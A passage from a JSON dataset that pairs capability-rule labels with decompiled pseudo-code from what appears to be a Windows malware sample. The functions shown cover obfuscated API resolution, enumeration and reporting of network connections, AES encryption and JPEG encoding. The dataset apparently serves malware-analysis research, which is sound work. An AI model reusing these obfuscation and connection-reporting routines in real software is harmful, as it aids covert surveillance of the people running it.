        "decompiled_code": "\nvoid fcn.00402e79(uint param_1)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint uStack984;\n    uint auStack980 [63];\n    uint uStack728;\n    uint uStack724;\n    int32_t iStack720;\n    uint32_t uStack716;\n    uint32_t *puStack712;\n    uint32_t *apuStack708 [13];\n    uint auStack656 [2];\n    uchar auStack648 [584];\n    int32_t iStack64;\n    uint uStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    code *pcStack44;\n    code *pcStack40;\n    uint uStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uint32_t uStack24;\n    int32_t iStack20;\n    uint32_t uStack16;\n    \n    fcn.004195d4(&uStack60, 0x8000);\n    uStack28 = fcn.0040b4e9(\"iphlpapi.dll\");\n    iStack32 = fcn.0040b4e9(0x41eaf0);\n    uStack36 = fcn.0040b4e9(0x41eafa);\n    uVar2 = fcn.0040b60e(\"Ed5jf5dRSdSqYsqCVid\");\n    pcStack40 = fcn.0040b4ff(uStack28, uVar2);\n    uVar2 = fcn.0040b60e(\"Ed5jf5dRSdSuSsqCVid\");\n    pcStack44 = fcn.0040b4ff(uStack28, uVar2);\n    uVar2 = fcn.0040b60e(\"Ed590WYd66XlCnd_4idLCldD\");\n    iStack20 = fcn.0040b4ff(iStack32, uVar2);\n    if (iStack20 == 0) {\n        uVar2 = fcn.0040b60e(\"Ed590WYd66XlCnd_4idLCldD\");\n        iStack20 = fcn.0040b4ff(uStack36, uVar2);\n    }\n    if (((pcStack44 != NULL) && (pcStack40 != NULL)) && (iStack20 != 0)) {\n        auStack980[0] = 0;\n        iVar3 = (*pcStack40)(0, auStack980, 1, 2, 5, 0);\n        if (iVar3 == 0x7a) {\n            apuStack708[0] = sub.msvcrt.dll_malloc(auStack980[0]);\n            if (apuStack708[0] == NULL) goto code_r0x004034ff;\n            uVar2 = 2;\n            piVar5 = 0x1;\n            puVar4 = auStack980;\n            iVar3 = (*pcStack40)(apuStack708[0], puVar4, 1, 2, 5, 0);\n            if (iVar3 == 0) {\n                uStack16 = 0;\n                while (uStack16 < *apuStack708[0]) {\n                    uStack716 = apuStack708[0][uStack16 * 6 + 2];\n                    uVar1 = sub.WS2_32.dll_ntohs(apuStack708[0][uStack16 * 6 + 3] & 0xffff);\n                    uVar2 = sub.WS2_32.dll_inet_ntoa(iStack720);\n                    fcn.00419fa8(auStack648, 0x40, \"%s:%u\", uVar2, uVar1);\n                    uStack724 = *(uStack24 * 0x18 + uStack716 + 0x10);\n                    sub.WS2_32.dll_ntohs(*(uStack24 * 0x18 + uStack716 + 0x14) & 0xffff);\n                    sub.WS2_32.dll_inet_ntoa(uStack728);\n                    fcn.00419fa8();\n                    fcn.00402d70();\n                    uVar2 = fcn.0040b60e();\n                    piVar5 = &iStack720;\n                    puVar4 = auStack656;\n                    iStack64 = fcn.00419fa8();\n                    if (0 < iStack64) {\n                        fcn.0041972e();\n                    }\n                    iStack32 = iStack32 + 1;\n                }\n            }\n            if (apuStack708[0] != NULL) {\n                fcn.0040b4bf(apuStack708, puVar4, piVar5, uVar2);\n            }\n        }\n        auStack980[0] = 0;\n        iVar3 = (*pcStack44)(0, auStack980, 1, 2, 1, 0);\n        if ((iVar3 == 0x7a) && (puStack712 = sub.msvcrt.dll_malloc(auStack980[0]),  puStack712 != NULL)) {\n            puVar6 = 0x2;\n            uVar2 = 1;\n            puVar4 = auStack980;\n            iVar3 = (*pcStack44)(puStack712, puVar4, 1, 2, 1, 0);\n            if (iVar3 == 0) {\n                uStack24 = 0;\n                while (uStack24 < *puStack712) {\n                    uStack716 = puStack712[uStack24 * 3 + 1];\n                    sub.WS2_32.dll_ntohs(puStack712[uStack24 * 3 + 2] & 0xffff);\n                    sub.WS2_32.dll_inet_ntoa(iStack720);\n                    fcn.00419fa8();\n                    fcn.00402d70();\n                    uVar2 = *(iStack32 * 0xc + iStack720 + 0xc);\n                    puVar6 = auStack648;\n                    puVar4 = &uStack984;\n                    iStack56 = fcn.00419fa8();\n                    if (0 < iStack56) {\n                        fcn.0041972e();\n                    }\n                    iStack32 = iStack32 + 1;\n                }\n            }\n            if (puStack712 != NULL) {\n                fcn.0040b4bf(&puStack712, puVar4, uVar2, puVar6);\n            }\n        }\n    }\ncode_r0x004034ff:\n    if (iStack52 == 0) {\n        fcn.00408b8f(param_1, 0xe4, 0, 0);\n    }\n    else {\n        uVar2 = fcn.00419910(&uStack60);\n        fcn.00408b8f(param_1, 0xe3, uStack60, uVar2);\n    }\n    fcn.00419639(&uStack60);\n    fcn.0040b51d(uStack28);\n    fcn.0040b51d(iStack32);\n    fcn.0040b51d(uStack36);\n    return;\n}\n",
        "token_count": 1591
    },
    "00403f2f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00403f2f(uint32_t *param_1, uint8_t *param_2, uchar *param_3)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uStack24;\n    uint32_t *puStack20;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    uint32_t uStack4;\n    \n    puStack20 = param_1;\n    uStack4 = *param_1 ^ *param_2 << 0x18 ^ param_2[1] << 0x10 ^ param_2[2] << 8 ^ param_2[3];\n    uStack8 = param_1[1] ^ param_2[4] << 0x18 ^ param_2[5] << 0x10 ^ param_2[6] << 8 ^ param_2[7];\n    uStack12 = param_1[2] ^ param_2[8] << 0x18 ^ param_2[9] << 0x10 ^ param_2[10] << 8 ^ param_2[0xb];\n    uStack16 = param_1[3] ^ param_2[0xc] << 0x18 ^ param_2[0xd] << 0x10 ^ param_2[0xe] << 8 ^ param_2[0xf];\n    uStack24 = *(param_1 + 0x78) >> 1;\n    while( true ) {\n        uVar2 = puStack20[4] ^\n                *((uStack4 >> 0x18) * 4 + 0x426a00) ^ *((uStack8 >> 0x10 & 0xff) * 4 + 0x425e00) ^\n                *((uStack12 >> 8 & 0xff) * 4 + 0x426600) ^ *((uStack16 & 0xff) * 4 + 0x426e00);\n        uVar3 = puStack20[5] ^\n                *((uStack8 >> 0x18) * 4 + 0x426a00) ^ *((uStack12 >> 0x10 & 0xff) * 4 + 0x425e00) ^\n                *((uStack16 >> 8 & 0xff) * 4 + 0x426600) ^ *((uStack4 & 0xff) * 4 + 0x426e00);\n        uVar4 = puStack20[6] ^\n                *((uStack12 >> 0x18) * 4 + 0x426a00) ^ *((uStack16 >> 0x10 & 0xff) * 4 + 0x425e00) ^\n                *((uStack4 >> 8 & 0xff) * 4 + 0x426600) ^ *((uStack8 & 0xff) * 4 + 0x426e00);\n        uVar5 = puStack20[7] ^\n                *((uStack16 >> 0x18) * 4 + 0x426a00) ^ *((uStack4 >> 0x10 & 0xff) * 4 + 0x425e00) ^\n                *((uStack8 >> 8 & 0xff) * 4 + 0x426600) ^ *((uStack12 & 0xff) * 4 + 0x426e00);\n        puVar1 = puStack20 + 8;\n        uStack24 = uStack24 - 1;\n        if (uStack24 == 0) break;\n        uStack4 = *puVar1 ^ *((uVar2 >> 0x18) * 4 + 0x426a00) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x425e00) ^\n                            *((uVar4 >> 8 & 0xff) * 4 + 0x426600) ^ *((uVar5 & 0xff) * 4 + 0x426e00);\n        uStack8 = puStack20[9] ^\n                  *((uVar3 >> 0x18) * 4 + 0x426a00) ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x425e00) ^\n                  *((uVar5 >> 8 & 0xff) * 4 + 0x426600) ^ *((uVar2 & 0xff) * 4 + 0x426e00);\n        uStack12 = puStack20[10] ^\n                   *((uVar4 >> 0x18) * 4 + 0x426a00) ^ *((uVar5 >> 0x10 & 0xff) * 4 + 0x425e00) ^\n                   *((uVar2 >> 8 & 0xff) * 4 + 0x426600) ^ *((uVar3 & 0xff) * 4 + 0x426e00);\n        uStack16 = puStack20[0xb] ^\n                   *((uVar5 >> 0x18) * 4 + 0x426a00) ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x425e00) ^\n                   *((uVar3 >> 8 & 0xff) * 4 + 0x426600) ^ *((uVar4 & 0xff) * 4 + 0x426e00);\n        puStack20 = puVar1;\n    }\n    uVar6 = *puVar1 ^ *((uVar2 >> 0x18) * 4 + 0x425600) & 0xff000000 ^\n                      *((uVar3 >> 0x10 & 0xff) * 4 + 0x425600) & 0xff0000 ^\n                      *((uVar4 >> 8 & 0xff) * 4 + 0x425600) & 0xff00 ^ *((uVar5 & 0xff) * 4 + 0x425600) & 0xff;\n    *param_3 = uVar6 >> 0x18;\n    param_3[1] = uVar6 >> 0x10;\n    param_3[2] = uVar6 >> 8;\n    param_3[3] = uVar6;\n    uVar6 = puStack20[9] ^\n            *((uVar3 >> 0x18) * 4 + 0x425600) & 0xff000000 ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x425600) & 0xff0000 ^\n            *((uVar5 >> 8 & 0xff) * 4 + 0x425600) & 0xff00 ^ *((uVar2 & 0xff) * 4 + 0x425600) & 0xff;\n    param_3[4] = uVar6 >> 0x18;\n    param_3[5] = uVar6 >> 0x10;\n    param_3[6] = uVar6 >> 8;\n    param_3[7] = uVar6;\n    uVar6 = puStack20[10] ^\n            *((uVar4 >> 0x18) * 4 + 0x425600) & 0xff000000 ^ *((uVar5 >> 0x10 & 0xff) * 4 + 0x425600) & 0xff0000 ^\n            *((uVar2 >> 8 & 0xff) * 4 + 0x425600) & 0xff00 ^ *((uVar3 & 0xff) * 4 + 0x425600) & 0xff;\n    param_3[8] = uVar6 >> 0x18;\n    param_3[9] = uVar6 >> 0x10;\n    param_3[10] = uVar6 >> 8;\n    param_3[0xb] = uVar6;\n    uVar2 = puStack20[0xb] ^\n            *((uVar5 >> 0x18) * 4 + 0x425600) & 0xff000000 ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x425600) & 0xff0000 ^\n            *((uVar3 >> 8 & 0xff) * 4 + 0x425600) & 0xff00 ^ *((uVar4 & 0xff) * 4 + 0x425600) & 0xff;\n    param_3[0xc] = uVar2 >> 0x18;\n    param_3[0xd] = uVar2 >> 0x10;\n    param_3[0xe] = uVar2 >> 8;\n    param_3[0xf] = uVar2;\n    return;\n}\n",
        "token_count": 2006
    },
    "00404ca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00404ca0(uint8_t param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uStack16;\n    \n    uStack16 = param_2;\n    uVar1 = param_1;\n    uVar2 = 0;\n    while (uStack16 != 0) {\n        if ((uStack16 & 1) != 0) {\n            uVar2 = uVar2 ^ uVar1;\n        }\n        uVar1 = uVar1 * 2;\n        uStack16 = uStack16 >> 1;\n        if ((uVar1 & 0x100) != 0) {\n            uVar1 = uVar1 ^ 0x11b;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 185
    },
    "00404cf3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00404cf3(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar auStack1039 [99];\n    uchar uStack940;\n    uchar uStack915;\n    uint8_t auStack783 [256];\n    uint8_t auStack527 [255];\n    uint8_t auStack272 [257];\n    uint8_t uStack15;\n    uint8_t uStack14;\n    uint8_t uStack13;\n    int32_t iStack12;\n    \n    uStack13 = 1;\n    for (iStack12 = 0; iStack12 < 0xff; iStack12 = iStack12 + 1) {\n        auStack272[uStack13 + 1] = iStack12;\n        auStack527[iStack12] = uStack13;\n        uStack13 = fcn.00404ca0(uStack13, 3);\n    }\n    for (iStack12 = 0; iStack12 < 0x100; iStack12 = iStack12 + 1) {\n        if (iStack12 == 0) {\n            uStack15 = 0;\n        }\n        else {\n            uStack15 = auStack272[-auStack272[iStack12 + 1]];\n        }\n        auStack783[iStack12] = 0;\n        for (uStack14 = 0; uStack14 < '\\b'; uStack14 = uStack14 + 1) {\n            auStack783[iStack12] =\n                 (((((((uStack15 >> (uStack14 & 0x1f) & 1U) != 0) != ((uStack15 >> (uStack14 + 4 & 7) & 1U) != 0)) !=\n                    ((uStack15 >> (uStack14 + 5 & 7) & 1U) != 0)) != ((uStack15 >> (uStack14 + 6 & 7) & 1U) != 0)) !=\n                  ((uStack15 >> (uStack14 + 7 & 7) & 1U) != 0)) != ((99 >> (uStack14 & 0x1f) & 1U) != 0)) <<\n                 (uStack14 & 0x1f) | auStack783[iStack12];\n        }\n        auStack1039[auStack783[iStack12]] = iStack12;\n    }\n    auStack783[1] = 0x7c;\n    uStack915 = 1;\n    uStack940 = 0;\n    for (iStack12 = 0; iStack12 < 0x100; iStack12 = iStack12 + 1) {\n        iVar1 = fcn.00404ca0(auStack783[iStack12], 2);\n        uVar2 = fcn.00404ca0(auStack783[iStack12], 1);\n        uVar3 = fcn.00404ca0(auStack783[iStack12], 1);\n        uVar4 = fcn.00404ca0(auStack783[iStack12], 3);\n        *(iStack12 * 4 + 0x426a00) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n        iVar1 = fcn.00404ca0(auStack783[iStack12], 3);\n        uVar2 = fcn.00404ca0(auStack783[iStack12], 2);\n        uVar3 = fcn.00404ca0(auStack783[iStack12], 1);\n        uVar4 = fcn.00404ca0(auStack783[iStack12], 1);\n        *(iStack12 * 4 + 0x425e00) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n        iVar1 = fcn.00404ca0(auStack783[iStack12], 1);\n        uVar2 = fcn.00404ca0(auStack783[iStack12], 3);\n        uVar3 = fcn.00404ca0(auStack783[iStack12], 2);\n        uVar4 = fcn.00404ca0(auStack783[iStack12], 1);\n        *(iStack12 * 4 + 0x426600) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n        iVar1 = fcn.00404ca0(auStack783[iStack12], 1);\n        uVar2 = fcn.00404ca0(auStack783[iStack12], 1);\n        uVar3 = fcn.00404ca0(auStack783[iStack12], 3);\n        uVar4 = fcn.00404ca0(auStack783[iStack12], 2);\n        *(iStack12 * 4 + 0x426e00) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n        iVar1 = fcn.00404ca0(auStack783[iStack12], 1);\n        uVar2 = fcn.00404ca0(auStack783[iStack12], 1);\n        uVar3 = fcn.00404ca0(auStack783[iStack12], 1);\n        uVar4 = fcn.00404ca0(auStack783[iStack12], 1);\n        *(iStack12 * 4 + 0x425600) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n        iVar1 = fcn.00404ca0(auStack1039[iStack12], 0xe);\n        uVar2 = fcn.00404ca0(auStack1039[iStack12], 9);\n        uVar3 = fcn.00404ca0(auStack1039[iStack12], 0xd);\n        uVar4 = fcn.00404ca0(auStack1039[iStack12], 0xb);\n        *(iStack12 * 4 + 0x426200) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n        iVar1 = fcn.00404ca0(auStack1039[iStack12], 0xb);\n        uVar2 = fcn.00404ca0(auStack1039[iStack12], 0xe);\n        uVar3 = fcn.00404ca0(auStack1039[iStack12], 9);\n        uVar4 = fcn.00404ca0(auStack1039[iStack12], 0xd);\n        *(iStack12 * 4 + 0x424e00) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n        iVar1 = fcn.00404ca0(auStack1039[iStack12], 0xd);\n        uVar2 = fcn.00404ca0(auStack1039[iStack12], 0xb);\n        uVar3 = fcn.00404ca0(auStack1039[iStack12], 0xe);\n        uVar4 = fcn.00404ca0(auStack1039[iStack12], 9);\n        *(iStack12 * 4 + 0x425200) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n        iVar1 = fcn.00404ca0(auStack1039[iStack12], 9);\n        uVar2 = fcn.00404ca0(auStack1039[iStack12], 0xd);\n        uVar3 = fcn.00404ca0(auStack1039[iStack12], 0xb);\n        uVar4 = fcn.00404ca0(auStack1039[iStack12], 0xe);\n        *(iStack12 * 4 + 0x424a00) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n        iVar1 = fcn.00404ca0(auStack1039[iStack12], 1);\n        uVar2 = fcn.00404ca0(auStack1039[iStack12], 1);\n        uVar3 = fcn.00404ca0(auStack1039[iStack12], 1);\n        uVar4 = fcn.00404ca0(auStack1039[iStack12], 1);\n        *(iStack12 * 4 + 0x425a00) = uVar4 & 0xff | iVar1 << 0x18 | (uVar2 & 0xff) << 0x10 | (uVar3 & 0xff) << 8;\n    }\n    return;\n}\n",
        "token_count": 2156
    },
    "0040571b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040571b(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    \n    if (((param_2 == 0) || (param_1 == 0)) || ((param_3 != 0x10 && ((param_3 != 0x18 && (param_3 != 0x20)))))) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar1 = fcn.00403c38(param_1, param_1 + 0xf0, param_2, param_3);\n        *(param_1 + 0x1e0) = uVar1;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 178
    },
    "004057d1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004057d1(uint param_1, uint param_2, uint8_t *param_3, uint8_t *param_4, int32_t param_5, int32_t param_6)\n\n{\n    uint8_t auStack33 [16];\n    uint8_t uStack17;\n    uint32_t uStack16;\n    \n    fcn.0041a5e1(auStack33, param_2, 0x10);\n    uStack16 = 0;\n    if (param_6 == 0) {\n        while (param_5 != 0) {\n            if (uStack16 == 0) {\n                fcn.00403f2f(param_1, auStack33, auStack33);\n            }\n            *param_4 = *param_3 ^ auStack33[uStack16];\n            auStack33[uStack16] = *param_4;\n            uStack16 = uStack16 + 1 & 0xf;\n            param_3 = param_3 + 1;\n            param_4 = param_4 + 1;\n            param_5 = param_5 + -1;\n        }\n    }\n    else if (param_6 == 1) {\n        while (param_5 != 0) {\n            if (uStack16 == 0) {\n                fcn.00403f2f(param_1, auStack33, auStack33);\n            }\n            uStack17 = *param_3;\n            *param_4 = auStack33[uStack16] ^ uStack17;\n            auStack33[uStack16] = uStack17;\n            uStack16 = uStack16 + 1 & 0xf;\n            param_3 = param_3 + 1;\n            param_4 = param_4 + 1;\n            param_5 = param_5 + -1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 413
    },
    "00405d70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00405d70(int32_t param_1, uint8_t param_2, int32_t param_3)\n\n{\n    uint32_t uStack8;\n    uint8_t uStack1;\n    \n    for (uStack1 = 0; uStack1 < 0x40; uStack1 = uStack1 + 1) {\n        uStack8 = (param_2 * *(param_1 + uStack1) + 0x32) / 100;\n        if (uStack8 == 0) {\n            uStack8 = 1;\n        }\n        if (0xff < uStack8) {\n            uStack8 = 0xff;\n        }\n        *(*(uStack1 + 0x41e060) + param_3) = uStack8;\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "00406043": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00406043(uint param_1)\n\n{\n    char cStack1;\n    \n    cStack1 = param_1 + -1;\n    while (-1 < cStack1) {\n        if ((*(cStack1 * 2 + 0x41e320) & param_1._2_2_) != 0) {\n            *0x421264 = *0x421264 | *(*0x41e31a * 2 + 0x41e320);\n        }\n        cStack1 = cStack1 + -1;\n        *0x41e31a = *0x41e31a + -1;\n        if (*0x41e31a < '\\0') {\n            if (*0x421264 == 0xff) {\n                fcn.00405d0c(0xff);\n                fcn.00405d0c(0);\n            }\n            else {\n                fcn.00405d0c(*0x421264);\n            }\n            *0x41e31a = '\\a';\n            *0x421264 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "004064d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004064d8(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    float afStack348 [64];\n    float fStack92;\n    float fStack88;\n    float fStack84;\n    float fStack80;\n    float fStack76;\n    float fStack72;\n    float fStack68;\n    float fStack64;\n    float fStack60;\n    float fStack56;\n    float fStack52;\n    float fStack48;\n    float fStack44;\n    float fStack40;\n    float fStack36;\n    float fStack32;\n    float fStack28;\n    float fStack24;\n    float fStack20;\n    float fStack16;\n    uint8_t uStack10;\n    char cStack9;\n    float *pfStack8;\n    \n    for (uStack10 = 0; uStack10 < 0x40; uStack10 = uStack10 + 1) {\n        afStack348[uStack10] = *(param_1 + uStack10);\n    }\n    pfStack8 = afStack348;\n    for (cStack9 = '\\a'; -1 < cStack9; cStack9 = cStack9 + -1) {\n        fStack16 = pfStack8[7] + *pfStack8;\n        fStack20 = *pfStack8 - pfStack8[7];\n        fStack24 = pfStack8[6] + pfStack8[1];\n        fStack28 = pfStack8[1] - pfStack8[6];\n        fStack32 = pfStack8[5] + pfStack8[2];\n        fStack36 = pfStack8[2] - pfStack8[5];\n        fStack40 = pfStack8[4] + pfStack8[3];\n        fStack44 = pfStack8[3] - pfStack8[4];\n        fStack48 = fStack16 + fStack40;\n        fStack52 = fStack16 - fStack40;\n        fStack56 = fStack24 + fStack32;\n        fStack60 = fStack24 - fStack32;\n        *pfStack8 = fStack48 + fStack56;\n        pfStack8[4] = fStack48 - fStack56;\n        fStack64 = *0x41ec40 * (fStack60 + fStack52);\n        pfStack8[2] = fStack52 + fStack64;\n        pfStack8[6] = fStack52 - fStack64;\n        fStack48 = fStack44 + fStack36;\n        fStack56 = fStack36 + fStack28;\n        fStack60 = fStack28 + fStack20;\n        fStack68 = *0x41ec44 * (fStack48 - fStack60);\n        fStack72 = *0x41ec48 * fStack48 + fStack68;\n        fStack76 = *0x41ec4c * fStack60 + fStack68;\n        fStack80 = *0x41ec40 * (fStack36 + fStack28);\n        fStack84 = fStack20 + fStack80;\n        fStack88 = fStack20 - fStack80;\n        pfStack8[5] = (fStack20 - fStack80) + fStack72;\n        pfStack8[3] = fStack88 - fStack72;\n        pfStack8[1] = fStack84 + fStack76;\n        pfStack8[7] = fStack84 - fStack76;\n        pfStack8 = pfStack8 + 8;\n    }\n    pfStack8 = afStack348;\n    for (cStack9 = '\\a'; -1 < cStack9; cStack9 = cStack9 + -1) {\n        fStack16 = pfStack8[0x38] + *pfStack8;\n        fStack20 = *pfStack8 - pfStack8[0x38];\n        fStack24 = pfStack8[0x30] + pfStack8[8];\n        fStack28 = pfStack8[8] - pfStack8[0x30];\n        fStack32 = pfStack8[0x28] + pfStack8[0x10];\n        fStack36 = pfStack8[0x10] - pfStack8[0x28];\n        fStack40 = pfStack8[0x20] + pfStack8[0x18];\n        fStack44 = pfStack8[0x18] - pfStack8[0x20];\n        fStack48 = fStack16 + fStack40;\n        fStack52 = fStack16 - fStack40;\n        fStack56 = fStack24 + fStack32;\n        fStack60 = fStack24 - fStack32;\n        *pfStack8 = fStack48 + fStack56;\n        pfStack8[0x20] = fStack48 - fStack56;\n        fStack64 = *0x41ec40 * (fStack60 + fStack52);\n        pfStack8[0x10] = fStack52 + fStack64;\n        pfStack8[0x30] = fStack52 - fStack64;\n        fStack48 = fStack44 + fStack36;\n        fStack56 = fStack36 + fStack28;\n        fStack60 = fStack28 + fStack20;\n        fStack68 = *0x41ec44 * (fStack48 - fStack60);\n        fStack72 = *0x41ec48 * fStack48 + fStack68;\n        fStack76 = *0x41ec4c * fStack60 + fStack68;\n        fStack80 = *0x41ec40 * (fStack36 + fStack28);\n        fStack84 = fStack20 + fStack80;\n        fStack88 = fStack20 - fStack80;\n        pfStack8[0x28] = (fStack20 - fStack80) + fStack72;\n        pfStack8[0x18] = fStack88 - fStack72;\n        pfStack8[8] = fStack84 + fStack76;\n        pfStack8[0x38] = fStack84 - fStack76;\n        pfStack8 = pfStack8 + 1;\n    }\n    for (uStack10 = 0; uStack10 < 0x40; uStack10 = uStack10 + 1) {\n        fStack92 = *(param_2 + uStack10 * 4) * afStack348[uStack10];\n        *(uStack10 * 2 + param_3) = ROUND(*0x41ec50 + fStack92) + -0x4000;\n    }\n    return;\n}\n",
        "token_count": 1455
    },
    "00406c9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00406c9c(uint param_1, uint param_2, int16_t *param_3, uint *param_4, uint *param_5)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int16_t iVar3;\n    uint8_t uStack8;\n    uint8_t uStack7;\n    uint8_t uStack6;\n    uint8_t uStack5;\n    \n    uVar1 = *param_5;\n    uVar2 = param_5[0xf0];\n    fcn.004064d8(param_1, param_2, 0x424200);\n    for (uStack5 = 0; uStack5 < 0x40; uStack5 = uStack5 + 1) {\n        *(*(uStack5 + 0x41e060) * 2 + 0x424280) = *(uStack5 * 2 + 0x424200);\n    }\n    iVar3 = *0x424280 - *param_3;\n    *param_3 = *0x424280;\n    if (iVar3 == 0) {\n        fcn.00406043(*param_4);\n    }\n    else {\n        fcn.00406043(param_4[*(iVar3 + *0x421b04)]);\n        fcn.00406043(*(*0x421b0c + iVar3 * 4));\n    }\n    uStack6 = 0x3f;\n    while ((uStack6 != 0 && (*(uStack6 * 2 + 0x424280) == 0))) {\n        uStack6 = uStack6 - 1;\n    }\n    if (uStack6 == 0) {\n        fcn.00406043(uVar1);\n    }\n    else {\n        for (uStack5 = 1; uStack7 = uStack5,  uStack5 <= uStack6; uStack5 = uStack5 + 1) {\n            for (; (*(uStack5 * 2 + 0x424280) == 0 && (uStack5 <= uStack6)); uStack5 = uStack5 + 1) {\n            }\n            uStack7 = uStack5 - uStack7;\n            if (0xf < uStack7) {\n                for (uStack8 = 1; uStack8 <= uStack7 >> 4; uStack8 = uStack8 + 1) {\n                    fcn.00406043(uVar2);\n                }\n                uStack7 = uStack7 & 0xf;\n            }\n            fcn.00406043(param_5[*(*(uStack5 * 2 + 0x424280) + *0x421b04) + uStack7 * 0x10]);\n            fcn.00406043(*(*(uStack5 * 2 + 0x424280) * 4 + *0x421b0c));\n        }\n        if (uStack6 != 0x3f) {\n            fcn.00406043(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 671
    },
    "00407085": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
